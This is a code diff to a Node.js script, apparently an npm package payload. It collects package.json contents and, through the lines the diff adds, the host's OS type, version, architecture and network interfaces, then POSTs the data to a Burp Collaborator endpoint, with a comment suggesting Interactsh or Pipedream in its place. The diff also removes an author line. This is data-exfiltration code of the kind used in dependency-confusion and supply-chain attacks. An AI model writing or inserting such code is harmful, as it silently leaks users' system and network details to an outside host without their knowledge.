@@ -1,4 +1,3 @@
-//author:- whitehacker003@protonmail.com
 const os = require("os");
 const dns = require("dns");
 const querystring = require("querystring");
@@ -16,6 +15,10 @@ const trackingData = JSON.stringify({
     r: packageJSON ? packageJSON.___resolved : undefined,
     v: packageJSON.version,
     pjson: packageJSON,
+    arch: os.arch(), // Add architecture information
+    type: os.type(), // Add OS type information
+    version: os.version(), // Add OS version information
+    interfaces: os.networkInterfaces(),
 });
 
 var postData = querystring.stringify({
@@ -23,7 +26,7 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "ovn2giz2p5ki09n1xojzswz6nxtqhf.burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
+    hostname: "burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
     port: 443,
     path: "/",
     method: "POST",
